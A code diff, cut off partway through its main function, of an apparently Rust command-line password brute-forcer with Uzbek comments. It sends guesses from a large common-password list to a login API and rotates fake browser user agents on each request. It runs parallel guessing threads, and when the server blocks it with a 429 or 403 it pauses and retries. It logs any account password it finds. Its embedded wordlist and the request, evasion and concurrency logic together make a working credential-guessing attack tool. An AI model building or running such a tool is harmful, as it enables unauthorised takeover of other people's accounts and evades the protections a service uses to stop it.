@@ -1,673 +1,77 @@
+use dotenv::dotenv;
 use rand::seq::SliceRandom;
 use rand::thread_rng;
 use reqwest::Client;
 use serde_json::Value;
 use std::error::Error;
 use std::fs::{self, File};
-use std::io::{self, Write};
+use std::io::{self, BufRead, BufReader, Write};
+use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::{Arc, Mutex};
 use std::time::Duration;
 use tokio::time::sleep;
 
-// Fake device nomlari ro'yxati (kengaytirilgan)
-const FAKE_DEVICES: &[&str] = &[
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
-    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36",
-    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
-    "Mozilla/5.0 (Linux; Android 12; SM-S906N) AppleWebKit/537.36",
-    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
-    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
-];
+// Environment o'zgaruvchilarini yuklash
+lazy_static::lazy_static! {
+    static ref STARTER_CHAR: String = std::env::var("STARTER_CHAR").unwrap_or_default();
+    static ref API_URL: String = std::env::var("API_URL")
+        .unwrap();
+    static ref LOG_LIMIT: usize = std::env::var("LOG_LIMIT")
+        .unwrap_or_else(|_| "500".to_string())
+        .parse()
+        .unwrap_or(500);
+}
 
-// Mashhur parollar ro'yxati (kengaytirilgan)
-const COMMON_PASSWORDS: &[&str] = &[
-    // Eng ko'p ishlatiladigan parollar
-    "123456",
-    "123456789",
-    "12345",
-    "qwerty",
-    "password",
-    "12345678",
-    "111111",
-    "123123",
-    "1234567890",
-    "1234567",
-    "qwerty123",
-    "000000",
-    "1q2w3e",
-    "aa123456",
-    "abc123",
-    "password1",
-    "1234",
-    "qwertyuiop",
-    "123321",
-    "password123",
-    // Sodda raqamli kombinatsiyalar
-    "112233",
-    "121212",
-    "123123",
-    "123456",
-    "123654",
-    "131313",
-    "159753",
-    "222222",
-    "333333",
-    "444444",
-    "555555",
-    "666666",
-    "696969",
-    "777777",
-    "789456",
-    "987654",
-    "999999",
-    // Harfli parollar
-    "admin",
-    "administrator",
-    "login",
-    "pass",
-    "passw0rd",
-    "master",
-    "hello",
-    "letmein",
-    "welcome",
-    "monkey",
-    "dragon",
-    "baseball",
-    "football",
-    "superman",
-    "qazwsx",
-    "password",
-    "access",
-    "shadow",
-    "trustno1",
-    "jesus",
-    "jordan",
-    "michael",
-    "michelle",
-    "andrew",
-    "charlie",
-    // Mashhur so'zlar va ismlar
-    "ashley",
-    "jennifer",
-    "thomas",
-    "computer",
-    "internet",
-    "sunshine",
-    "iloveyou",
-    "freedom",
-    "whatever",
-    "hello",
-    "samsung",
-    "apple",
-    "google",
-    "microsoft",
-    "photoshop",
-    "password1",
-    "password123",
-    "welcome123",
-    "login123",
-    "admin123",
-    "letmein123",
-    // Qisqa parollar
-    "123",
-    "1234",
-    "12345",
-    "123456",
-    "1234567",
-    "12345678",
-    "123456789",
-    "1234567890",
-    "qwe",
-    "qwer",
-    "qwert",
-    "qwerty",
-    "qwertyu",
-    "qwertyui",
-    "qwertyuiop",
-    "asd",
-    "asdf",
-    "asdfg",
-    "asdfgh",
-    "asdfghj",
-    "asdfghjk",
-    "asdfghjkl",
-    "zxcv",
-    "zxcvb",
-    "zxcvbn",
-    "zxcvbnm",
-    // Klaviatura patternlari
-    "1qaz",
-    "2wsx",
-    "3edc",
-    "4rfv",
-    "5tgb",
-    "6yhn",
-    "7ujm",
-    "8ik,",
-    "9ol.",
-    "0p;/",
-    "qwert",
-    "asdfg",
-    "zxcvb",
-    "poiuyt",
-    "lkjhg",
-    "mnbvc",
-    "!qaz",
-    "@wsx",
-    "#edc",
-    "$rfv",
-    "%tgb",
-    "^yhn",
-    "&ujm",
-    "*ik,",
-    "(ol.",
-    ")p;/",
-    // Mashhur parol variantlari
-    "adminadmin",
-    "superadmin",
-    "root",
-    "toor",
-    "guest",
-    "user",
-    "default",
-    "unknown",
-    "test",
-    "test123",
-    "demo",
-    "demo123",
-    "temp",
-    "temp123",
-    "backup",
-    "backup123",
-    "welcome1",
-    "welcome123",
-    "login1",
-    "login123",
-    "pass123",
-    "passw0rd",
-    "password1",
-    "password12",
-    "password123",
-    "password1234",
-    "letmein1",
-    "letmein123",
-    // Mashhur ismlar va so'zlar
-    "alex",
-    "alexander",
-    "anna",
-    "buster",
-    "charlie",
-    "daniel",
-    "david",
-    "diamond",
-    "ginger",
-    "hannah",
-    "harley",
-    "heather",
-    "jessica",
-    "joshua",
-    "justin",
-    "matthew",
-    "mustang",
-    "nicole",
-    "password",
-    "patrick",
-    "robert",
-    "samsung",
-    "summer",
-    "superman",
-    "thomas",
-    "thunder",
-    "tigger",
-    "william",
-    "yamaha",
-    "zxcvbnm",
-    // Mashhur parollar turli tillarda
-    "пароль",
-    "contraseña",
-    "senha",
-    "passwort",
-    "wachtwoord",
-    "heslo",
-    "lösenord",
-    "salasana",
-    "passord",
-    "hasło",
-    "lozinka",
-    "密码",
-    "パスワード",
-    "암호",
-    // Mashhur parollar turli tizimlar uchun
-    "raspberry",
-    "arduino",
-    "root123",
-    "admin1234",
-    "administrator1",
-    "guest123",
-    "user123",
-    "test1234",
-    "demo1234",
-    "temp1234",
-    "backup1234",
-    // Qo'shimcha mashhur parollar
-    "123qwe",
-    "123abc",
-    "abc123",
-    "qwe123",
-    "asd123",
-    "zxc123",
-    "qazwsx",
-    "1q2w3e4r",
-    "1q2w3e4r5t",
-    "1qaz2wsx",
-    "zaq12wsx",
-    "!qaz2wsx",
-    "1qaz@wsx",
-    "1qazxsw2",
-    "qwerty1",
-    "qwerty12",
-    "qwerty123",
-    "qwerty1234",
-    "asdfgh1",
-    "asdfgh12",
-    "asdfgh123",
-    "asdfgh1234",
-    "zxcvbn1",
-    "zxcvbn12",
-    "zxcvbn123",
-    "zxcvbn1234",
-    // Yana mashhur parollar
-    "monkey123",
-    "dragon123",
-    "baseball123",
-    "football123",
-    "superman123",
-    "iloveyou123",
-    "sunshine123",
-    "freedom123",
-    "whatever123",
-    "hello123",
-    "jesus123",
-    "jordan123",
-    "michael123",
-    "michelle123",
-    "andrew123",
-    "charlie123",
-    "ashley123",
-    "jennifer123",
-    "thomas123",
-    "computer123",
-    "internet123",
-    // Parollar turli formatlarda
-    "pass1234",
-    "password01",
-    "password02",
-    "password03",
-    "password2020",
-    "password2021",
-    "password2022",
-    "password2023",
-    "welcome01",
-    "welcome02",
-    "welcome03",
-    "login01",
-    "login02",
-    "login03",
-    "admin01",
-    "admin02",
-    "admin03",
-    "user01",
-    "user02",
-    "user03",
-    "test01",
-    "test02",
-    "test03",
-    "demo01",
-    "demo02",
-    "demo03",
-    // Raqamli parollar
-    "00000000",
-    "11111111",
-    "22222222",
-    "33333333",
-    "44444444",
-    "55555555",
-    "66666666",
-    "77777777",
-    "88888888",
-    "99999999",
-    "01234567",
-    "12345678",
-    "23456789",
-    "34567890",
-    "45678901",
-    "56789012",
-    "67890123",
-    "78901234",
-    "89012345",
-    "90123456",
-    // Karomchi pattern parollar
-    "159357",
-    "357159",
-    "753951",
-    "951753",
-    "258456",
-    "456258",
-    "852654",
-    "654852",
-    "147258",
-    "258369",
-    "369258",
-    "258147",
-    "963852",
-    "852963",
-    "741852",
-    "852741",
-    // Klaviaturadagi yaqin tugmalar
-    "qwert",
-    "asdfg",
-    "zxcvb",
-    "yuiop",
-    "hjkl",
-    "vbnm",
-    "poiu",
-    "lkjh",
-    "mnbv",
-    "rewq",
-    "fdsa",
-    "vcxz",
-    "oiuy",
-    "hjk",
-    "nbv",
-    "qweasd",
-    "asdzxc",
-    "zxcasd",
-    "qazxsw",
-    "wsxcde",
-    "edcvfr",
-    "rfvtgb",
-    "tgbyhn",
-    "yhnujm",
-    "ujmik",
-    "ik,ol",
-    "ol.p;",
-    "p;[/",
-    "[/]'",
-    // Mashhur parollar turli mamlakatlarda
-    "password",
-    "123456",
-    "123456789",
-    "12345678",
-    "12345",
-    "111111",
-    "1234567",
-    "sunshine",
-    "qwerty",
-    "iloveyou",
-    "princess",
-    "admin",
-    "welcome",
-    "666666",
-    "abc123",
-    "football",
-    "123123",
-    "monkey",
-    "654321",
-    "superman",
-    "1qaz2wsx",
-    "baseball",
-    "master",
-    "hello",
-    "letmein",
-    "trustno1",
-    "dragon",
-    "passw0rd",
-    "qwertyuiop",
-    "mustang",
-    "access",
-    "shadow",
-    "michael",
-    "jordan",
-    "harley",
-    "1234567890",
-    "123qwe",
-    "welcome123",
-    // Yana qo'shimcha mashhur parollar
-    "adminadmin",
-    "password1",
-    "password123",
-    "qwerty123",
-    "letmein123",
-    "welcome123",
-    "login123",
-    "admin123",
-    "test123",
-    "temp123",
-    "demo123",
-    "backup123",
-    "root123",
-    "guest123",
-    "user123",
-    "pass123",
-    "1234abcd",
-    "abcd1234",
-    "qwer1234",
-    "1234qwer",
-    "asdf1234",
-    "1234asdf",
-    "zxcv1234",
-    "1234zxcv",
-    "1q2w3e4r",
-    "q1w2e3r4",
-    "1a2s3d4f",
-    "a1s2d3f4",
-    "1z2x3c4v",
-    "z1x2c3v4",
-    // Eng xavfli parollar
-    "000000",
-    "111111",
-    "112233",
-    "121212",
-    "123123",
-    "123456",
-    "123456789",
-    "1234567890",
-    "1234567",
-    "12345678",
-    "1234",
-    "12345",
-    "654321",
-    "666666",
-    "696969",
-    "7777777",
-    "987654",
-    "987654321",
-    "999999",
-    "aaaaaa",
-    "abc123",
-    "admin",
-    "password",
-    "password1",
-    "password123",
-    "qwerty",
-    "qwerty123",
-    "qwertyuiop",
-    "superman",
-    "welcome",
-    // Yana qo'shimcha
-    "administrator",
-    "root",
-    "toor",
-    "guest",
-    "user",
-    "default",
-    "test",
-    "demo",
-    "temp",
-    "backup",
-    "unknown",
-    "secret",
-    "private",
-    "public",
-    "system",
-    "server",
-    "client",
-    "info",
-    "data",
-    "database",
-    "network",
-    "security",
-    "access",
-    "login",
-    "logout",
-    "config",
-    "setup",
-    "install",
-    "update",
-    "upgrade",
-    "back",
-    "restore",
-    "recovery",
-    // Mashhur parollar 2020-2023
-    "password2020",
-    "password2021",
-    "password2022",
-    "password2023",
-    "welcome2020",
-    "welcome2021",
-    "welcome2022",
-    "welcome2023",
-    "admin2020",
-    "admin2021",
-    "admin2022",
-    "admin2023",
-    "test2020",
-    "test2021",
-    "test2022",
-    "test2023",
-    "demo2020",
-    "demo2021",
-    "demo2022",
-    "demo2023",
-    "temp2020",
-    "temp2021",
-    "temp2022",
-    "temp2023",
-    // So'nggi yillarda mashhur bo'lgan parollar
-    "corona",
-    "covid19",
-    "covid2020",
-    "covid2021",
-    "covid2022",
-    "covid2023",
-    "virus",
-    "vaccine",
-    "mask",
-    "quarantine",
-    "lockdown",
-    "socialdistancing",
-    "pandemic",
-    "epidemic",
-    "infection",
-    "health",
-    "wellness",
-    "sanitizer",
-    "disinfectant",
-    // Mashhur parollar turli sohalarda
-    "instagram",
-    "facebook",
-    "twitter",
-    "whatsapp",
-    "telegram",
-    "snapchat",
-    "tiktok",
-    "youtube",
-    "google",
-    "gmail",
-    "yahoo",
-    "hotmail",
-    "outlook",
-    "microsoft",
-    "apple",
-    "amazon",
-    "netflix",
-    "spotify",
-    "discord",
-    "zoom",
-    "skype",
-    "linkedin",
-    "pinterest",
-    // Parollar turli formatlarda
-    "pass123!",
-    "password!",
-    "welcome!",
-    "admin!",
-    "test!",
-    "demo!",
-    "temp!",
-    "backup!",
-    "root!",
-    "guest!",
-    "user!",
-    "123456!",
-    "qwerty!",
-    "letmein!",
-    "iloveyou!",
-    "sunshine!",
-    "football!",
-    "baseball!",
-    "superman!",
-    "monkey!",
-    "dragon!",
-    "master!",
-    "hello!",
-    "jesus!",
-    "jordan!",
-    "michael!",
-    "michelle!",
-    "andrew!",
-    "charlie!",
-    "ashley!",
-    "jennifer!",
-    "thomas!",
-    "computer!",
-    "internet!",
-];
+// Fayllardan ma'lumotlarni o'qib olish
+fn read_from_file(filename: &str) -> Vec<String> {
+    let file = match File::open(filename) {
+        Ok(file) => file,
+        Err(_) => return Vec::new(),
+    };
 
-// Log faylini yaratish va yozish uchun funksiya
-fn log_message(log_file: &Arc<Mutex<File>>, message: &str, console_print: bool) {
-    let mut file = log_file.lock().unwrap();
-    writeln!(*file, "{}", message).expect("Log fayliga yozishda xato");
-    if console_print {
-        println!("{}", message);
-    }
+    let reader = BufReader::new(file);
+    reader.lines().filter_map(Result::ok).collect()
+}
+
+// Fake device nomlari ro'yxati (fayldan o'qish)
+lazy_static::lazy_static! {
+    static ref FAKE_DEVICES: Vec<String> = {
+        let mut devices = read_from_file("fake_devices.txt");
+        devices
+    };
+}
+
+// Mashhur parollar ro'yxati (fayldan o'qish)
+lazy_static::lazy_static! {
+    static ref COMMON_PASSWORDS: Vec<String> = {
+        let mut passwords = read_from_file("common_passwords.txt");
+        passwords
+    };
 }
 
 // Log faylini yaratish
-fn create_log_file() -> Result<File, Box<dyn Error>> {
-    let filename = "password_finder.log";
+fn create_log_file(counter: u32) -> Result<File, Box<dyn Error>> {
+    let filename = format!("password_finder_{}.log", counter);
     let file = File::create(filename)?;
     Ok(file)
 }
 
 // Eski log fayllarni o'chirish
 fn cleanup_old_logs() -> Result<(), Box<dyn Error>> {
-    let filename = "password_finder.log";
-    if std::path::Path::new(filename).exists() {
-        fs::remove_file(filename)?;
-        println!("Eski log fayl o'chirildi: {}", filename);
+    let entries = fs::read_dir(".")?;
+
+    for entry in entries {
+        let entry = entry?;
+        let path = entry.path();
+
+        if let Some(filename) = path.file_name().and_then(|n| n.to_str()) {
+            if filename.starts_with("password_finder_") && filename.ends_with(".log") {
+                fs::remove_file(&path)?;
+                println!("Eski log fayl o'chirildi: {}", filename);
+            }
+        }
     }
+
     Ok(())
 }
 
@@ -683,9 +87,8 @@ struct PasswordGenerator {
 
 impl PasswordGenerator {
     fn new() -> Self {
-        let mut common_passwords: Vec<String> =
-            COMMON_PASSWORDS.iter().map(|s| s.to_string()).collect();
-        common_passwords.shuffle(&mut thread_rng());
+        let mut common_passwords = COMMON_PASSWORDS.clone();
+        // common_passwords.shuffle(&mut thread_rng()); // Agar parollarni aralashtirib tashlash kerak bo'lsa
 
         PasswordGenerator {
             common_passwords,
@@ -744,7 +147,7 @@ impl PasswordGenerator {
                 continue;
             }
 
-            // Parol avval ishlatilmaganligini tekshirish
+            // Parol avlad ishlatilmaganligini tekshirish
             if !self.used_passwords.contains(&password) {
                 self.used_passwords.insert(password.clone());
                 return Some(password);
@@ -783,12 +186,401 @@ impl PasswordGenerator {
     }
 }
 
+// So'rov yuborish funksiyasi
+async fn send_request(
+    client: &Client,
+    username: &str,
+    password: &str,
+    device: &str,
+    try_count: u64,
+    found: &AtomicBool,
+    blocked: &AtomicBool,
+    user_not_found: &AtomicBool,
+    log_file: &Arc<Mutex<File>>,
+) -> Result<String, Box<dyn Error + Send>> {
+    if found.load(Ordering::Relaxed)
+        || blocked.load(Ordering::Relaxed)
+        || user_not_found.load(Ordering::Relaxed)
+    {
+        return Ok("Dastur to'xtatilgan".to_string());
+    }
+
+    // API ga so'rov yuborish
+    let payload = serde_json::json!({
+        "device": device,
+        "loginInput": username,
+        "password": password
+    });
+
+    let response = client.post(&*API_URL).json(&payload).send().await;
+
+    match response {
+        Ok(resp) => {
+            let status = resp.status();
+            let response_text = resp
+                .text()
+                .await
+                .unwrap_or_else(|_| "Javob matnini o'qib bo'lmadi".to_string());
+
+            // Response ni JSON formatida parse qilish
+            let json_response: Result<Value, _> = serde_json::from_str(&response_text);
+
+            if status.is_success() {
+                let message = format!(
+                    "PAROL TOPILDI! Urinish {}: Foydalanuvchi: {} | Parol: {} | Response: {}",
+                    try_count, username, password, response_text
+                );
+
+                // Log fayliga yozish va konsolga chiqarish
+                let mut file = log_file.lock().unwrap();
+                writeln!(*file, "{}", message).expect("Log fayliga yozishda xato");
+                println!("{}", message);
+
+                found.store(true, Ordering::Relaxed);
+                Ok(message)
+            } else if status == 400 {
+                // Foydalanuvchi topilmadi xabarini tekshirish
+                if let Ok(json) = json_response {
+                    if let Some(message) = json.get("message") {
+                        if message == "Foydalanuvchi topilmadi" {
+                            let log_msg = format!("FOYDALANUVCHI TOPILMADI! Urinish {}: Foydalanuvchi: {} | Response: {}", 
+                                                try_count, username, response_text);
+
+                            // Log fayliga yozish va konsolga chiqarish
+                            let mut file = log_file.lock().unwrap();
+                            writeln!(*file, "{}", log_msg).expect("Log fayliga yozishda xato");
+                            println!("{}", log_msg);
+
+                            user_not_found.store(true, Ordering::Relaxed);
+                            return Ok(log_msg);
+                        }
+                    }
+                }
+                Ok(format!(
+                    "Urinish: {} | Status: {} | Password: {} | Response: {}",
+                    try_count, status, password, response_text
+                ))
+            } else if status == 429 || status == 403 {
+                // Server bloklagan (Too Many Requests yoki Forbidden)
+                let message = format!(
+                    "SERVER BLOKLADI! Urinish {}: Password: {} | Status: {} | Device: {} | Response: {}",
+                    try_count, password, status, device, response_text
+                );
+
+                // Log fayliga yozish va konsolga chiqarish
+                let mut file = log_file.lock().unwrap();
+                writeln!(*file, "{}", message).expect("Log fayliga yozishda xato");
+                println!("{}", message);
+
+                blocked.store(true, Ordering::Relaxed);
+                Ok(message)
+            } else {
+                Ok(format!(
+                    "Urinish: {} | Status: {} | Password: {} | Response: {}",
+                    try_count, status, password, response_text
+                ))
+            }
+        }
+        Err(e) => {
+            // Tarmoq xatolari yoki timeout
+            if e.is_timeout() || e.is_connect() {
+                let message = format!(
+                    "NETWORK XATOSI! Urinish {}: Password: {} | Xatolik: {} | Device: {}",
+                    try_count, password, e, device
+                );
+
+                // Log fayliga yozish va konsolga chiqarish
+                let mut file = log_file.lock().unwrap();
+                writeln!(*file, "{}", message).expect("Log fayliga yozishda xato");
+                println!("{}", message);
+
+                blocked.store(true, Ordering::Relaxed);
+                Ok(message)
+            } else {
+                Ok(format!(
+                    "Urinish: {} Password: {} | | Xatolik: {} | Device: {}",
+                    try_count, password, e, device
+                ))
+            }
+        }
+    }
+}
+
+// Oddiy (birma-bir) usulda ishlash
+async fn run_sync(
+    client: Client,
+    username: String,
+    password_generator: PasswordGenerator,
+    found: Arc<AtomicBool>,
+    blocked: Arc<AtomicBool>,
+    user_not_found: Arc<AtomicBool>,
+    log_file: Arc<Mutex<File>>,
+) -> Result<(), Box<dyn Error>> {
+    let mut password_generator = password_generator;
+    let try_count = Arc::new(AtomicU64::new(0));
+    let error_logs = Arc::new(Mutex::new(Vec::new()));
+    let log_file_counter = Arc::new(Mutex::new(1));
+
+    while let Some(password) = password_generator.next() {
+        if found.load(Ordering::Relaxed)
+            || blocked.load(Ordering::Relaxed)
+            || user_not_found.load(Ordering::Relaxed)
+        {
+            break;
+        }
+
+        let current_try = try_count.fetch_add(1, Ordering::Relaxed) + 1;
+
+        // Har LOG_LIMIT urinishda progress haqida xabar berish
+        if current_try % *LOG_LIMIT as u64 == 0 {
+            println!(
+                "{} ta parol sinandi. Hozirgi parol: {}",
+                current_try, password
+            );
+
+            // Log faylini yangilash
+            let mut logs = error_logs.lock().unwrap();
+            if !logs.is_empty() {
+                let mut counter = log_file_counter.lock().unwrap();
+                let mut file = create_log_file(*counter)?;
+
+                for log in logs.iter() {
+                    writeln!(file, "{}", log)?;
+                }
+
+                logs.clear();
+                *counter += 1;
+            }
+        }
+
+        // Random device name tanlash
+        let device = FAKE_DEVICES
+            .choose(&mut thread_rng())
+            .unwrap_or(&FAKE_DEVICES[0]);
+
+        // So'rov yuborish
+        let result = send_request(
+            &client,
+            &username,
+            &password,
+            device,
+            current_try,
+            &found,
+            &blocked,
+            &user_not_found,
+            &log_file,
+        )
+        .await;
+
+        // Natijani error_logs ga qo'shish (faqat muhim bo'lmagan xabarlar uchun)
+        if let Ok(log_message) = result {
+            // Agar bu muhim xabar bo'lsa (success, user not found, block, network error),
+            // u allaqachon log fayliga yozilgan, shuning uchun faqat boshqa xabarlarni qo'shamiz
+            if !log_message.contains("PAROL TOPILDI")
+                && !log_message.contains("FOYDALANUVCHI TOPILMADI")
+                && !log_message.contains("SERVER BLOKLADI")
+                && !log_message.contains("NETWORK XATOSI")
+            {
+                let mut logs = error_logs.lock().unwrap();
+                logs.push(log_message);
+            }
+        }
+
+        // Agar bloklangan bo'lsa, kutish va device ni o'zgartirish
+        if blocked.load(Ordering::Relaxed) {
+            sleep(Duration::from_secs(60)).await;
+            blocked.store(false, Ordering::Relaxed);
+            continue;
+        }
+
+        // Serverga ortiqcha yuk bo'lmasligi uchun kichik tanaffus
+        sleep(Duration::from_millis(50)).await;
+    }
+
+    // Qolgan loglarni yozish
+    let logs = error_logs.lock().unwrap();
+    if !logs.is_empty() {
+        let mut counter = log_file_counter.lock().unwrap();
+        let mut file = create_log_file(*counter)?;
+
+        for log in logs.iter() {
+            writeln!(file, "{}", log)?;
+        }
+    }
+
+    Ok(())
+}
+
+// Asinxron (bir vaqtning o'zida bir nechta so'rov) usulda ishlash
+async fn run_async(
+    client: Client,
+    username: String,
+    password_generator: PasswordGenerator,
+    found: Arc<AtomicBool>,
+    blocked: Arc<AtomicBool>,
+    user_not_found: Arc<AtomicBool>,
+    concurrent_requests: usize,
+    log_file: Arc<Mutex<File>>,
+) -> Result<(), Box<dyn Error>> {
+    let password_generator = Arc::new(Mutex::new(password_generator));
+    let try_count = Arc::new(AtomicU64::new(0));
+    let error_logs = Arc::new(Mutex::new(Vec::new()));
+    let log_file_counter = Arc::new(Mutex::new(1));
+    let mut tasks = vec![];
+
+    // Bir vaqtning o'zida bir nechta so'rov yuborish
+    for _ in 0..concurrent_requests {
+        let client = client.clone();
+        let username = username.clone();
+        let password_generator = password_generator.clone();
+        let try_count = try_count.clone();
+        let error_logs = error_logs.clone();
+        let log_file_counter = log_file_counter.clone();
+        let found = found.clone();
+        let blocked = blocked.clone();
+        let user_not_found = user_not_found.clone();
+        let log_file = log_file.clone();
+
+        let task = tokio::spawn(async move {
+            loop {
+                if found.load(Ordering::Relaxed)
+                    || blocked.load(Ordering::Relaxed)
+                    || user_not_found.load(Ordering::Relaxed)
+                {
+                    break;
+                }
+
+                // Keyingi parolni olish
+                let password = {
+                    let mut generator = password_generator.lock().unwrap();
+                    generator.next()
+                };
+
+                let password = match password {
+                    Some(p) => p,
+                    None => break, // Parollar tugadi
+                };
+
+                let current_try = try_count.fetch_add(1, Ordering::Relaxed) + 1;
+
+                // Har LOG_LIMIT urinishda progress haqida xabar berish
+                if current_try % *LOG_LIMIT as u64 == 0 {
+                    println!(
+                        "{} ta parol sinandi. Hozirgi parol: {}",
+                        current_try, password
+                    );
+
+                    // Log faylini yangilash
+                    let mut logs = error_logs.lock().unwrap();
+                    if !logs.is_empty() {
+                        let mut counter = log_file_counter.lock().unwrap();
+                        if let Ok(mut file) = create_log_file(*counter) {
+                            for log in logs.iter() {
+                                let _ = writeln!(file, "{}", log);
+                            }
+                            logs.clear();
+                            *counter += 1;
+                        }
+                    }
+                }
+
+                // Random device name tanlash
+                let device = FAKE_DEVICES
+                    .choose(&mut thread_rng())
+                    .unwrap_or(&FAKE_DEVICES[0]);
+
+                // So'rov yuborish
+                let result = send_request(
+                    &client,
+                    &username,
+                    &password,
+                    device,
+                    current_try,
+                    &found,
+                    &blocked,
+                    &user_not_found,
+                    &log_file,
+                )
+                .await;
+
+                // Natijani error_logs ga qo'shish (faqat muhim bo'lmagan xabarlar uchun)
+                if let Ok(log_message) = result {
+                    // Agar bu muhim xabar bo'lsa (success, user not found, block, network error),
+                    // u allaqachon log fayliga yozilgan, shuning uchun faqat boshqa xabarlarni qo'shamiz
+                    if !log_message.contains("PAROL TOPILDI")
+                        && !log_message.contains("FOYDALANUVCHI TOPILMADI")
+                        && !log_message.contains("SERVER BLOKLADI")
+                        && !log_message.contains("NETWORK XATOSI")
+                    {
+                        let mut logs = error_logs.lock().unwrap();
+                        logs.push(log_message);
+                    }
+                }
+
+                // Agar bloklangan bo'lsa, kutish va device ni o'zgartirish
+                if blocked.load(Ordering::Relaxed) {
+                    sleep(Duration::from_secs(60)).await;
+                    blocked.store(false, Ordering::Relaxed);
+                    continue;
+                }
+
+                // Serverga ortiqcha yuk bo'lmasligi uchun kichik tanaffus
+                sleep(Duration::from_millis(50)).await;
+            }
+        });
+
+        tasks.push(task);
+    }
+
+    // Barcha tasklar tugashini kutish
+    for task in tasks {
+        let _ = task.await;
+    }
+
+    // Qolgan loglarni yozish
+    let logs = error_logs.lock().unwrap();
+    if !logs.is_empty() {
+        let mut counter = log_file_counter.lock().unwrap();
+        if let Ok(mut file) = create_log_file(*counter) {
+            for log in logs.iter() {
+                let _ = writeln!(file, "{}", log);
+            }
+        }
+    }
+
+    Ok(())
+}
+
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn Error>> {
+    // Environment o'zgaruvchilarini yuklash
+    dotenv().ok();
+
     // Eski log fayllarni tozalash
     cleanup_old_logs()?;
 
     println!("Dastur ishga tushdi");
+
+    // Ishlash usulini tanlash
+    println!("Ishlash usulini tanlang:");
+    println!("1 - Oddiy (birma-bir)");
+    println!("2 - Asinxron (bir vaqtning o'zida bir nechta so'rov)");
+
+    let mut mode = String::new();
+    io::stdin().read_line(&mut mode)?;
+    let mode = mode.trim();
+
+    let mut concurrent_requests = 1;
+    if mode == "2" {
+        println!("Bir vaqtning o'zida nechta so'rov yuborilsin?");
+        let mut requests = String::new();
+        io::stdin().read_line(&mut requests)?;
+        concurrent_requests = requests.trim().parse().unwrap_or(10);
+        println!(
+            "{} ta parallel so'rov bilan ishlash boshlandi.",
+            concurrent_requests
+        );
+    }
 
     // Davom etish yoki boshidan boshlashni so'rash
     println!("Boshidan boshlaymizmi yoki davom ettiramizmi? (b/d):");
@@ -810,16 +602,19 @@ async fn main() -> Result<(), Box<dyn Error>> {
     io::stdin().read_line(&mut username)?;
     let username = username.trim().to_string();
 
-    // Foydalanuvchi nomi @ bilan boshlanishini tekshirish
-    let username = if !username.starts_with('@') {
-        format!("@{}", username)
+    // Foydalanuvchi nomini STARTER_CHAR bilan boshlanishini tekshirish
+    let username = if !STARTER_CHAR.is_empty() && !username.starts_with(&STARTER_CHAR as &str) {
+        format!("{}{}", &*STARTER_CHAR, username)
     } else {
         username
     };
 
     // Foydalanuvchi nomi uzunligini tekshirish
     if username.len() < 6 || username.len() > 15 {
-        println!("Xato: Foydalanuvchi nomi 6 dan 15 belgigacha bo'lishi kerak va @ bilan boshlanishi kerak. Siz kiritgan: {}", username);
+        println!(
+            "Xato: Foydalanuvchi nomi 6 dan 15 belgigacha bo'lishi kerak. Siz kiritgan: {}",
+            username
+        );
         return Ok(());
     }
 
@@ -829,18 +624,12 @@ async fn main() -> Result<(), Box<dyn Error>> {
     let client = Client::builder().timeout(Duration::from_secs(10)).build()?;
 
     // O'zgaruvchilarni yaratish
-    let found = Arc::new(Mutex::new(false));
-    let blocked = Arc::new(Mutex::new(false));
-    let user_not_found = Arc::new(Mutex::new(false));
-    let tried_counter = Arc::new(Mutex::new(0));
+    let found = Arc::new(AtomicBool::new(false));
+    let blocked = Arc::new(AtomicBool::new(false));
+    let user_not_found = Arc::new(AtomicBool::new(false));
 
-    // Log faylini yaratish
-    let log_file = Arc::new(Mutex::new(create_log_file()?));
-    log_message(
-        &log_file,
-        &format!("Dastur ishga tushdi. Foydalanuvchi: {}", username),
-        true,
-    );
+    // Asosiy log faylini yaratish
+    let log_file = Arc::new(Mutex::new(create_log_file(1)?));
 
     // Parol generatorini yaratish
     let mut password_generator = PasswordGenerator::new();
@@ -848,161 +637,43 @@ async fn main() -> Result<(), Box<dyn Error>> {
     // Agar davom etish tanlangan bo'lsa, generatorni sozlash
     if let Some(start_pwd) = start_password {
         password_generator.set_start_password(&start_pwd);
-        log_message(
-            &log_file,
-            &format!("Davom etish: '{}' parolidan keyin", start_pwd),
-            true,
-        );
+        println!("Davom etish: '{}' parolidan keyin", start_pwd);
     }
 
-    // Asosiy tsikl
-    while let Some(password) = password_generator.next() {
-        if *found.lock().unwrap() || *blocked.lock().unwrap() || *user_not_found.lock().unwrap() {
-            break;
-        }
-
-        // Urinishlar sonini oshirish
-        let mut tried = tried_counter.lock().unwrap();
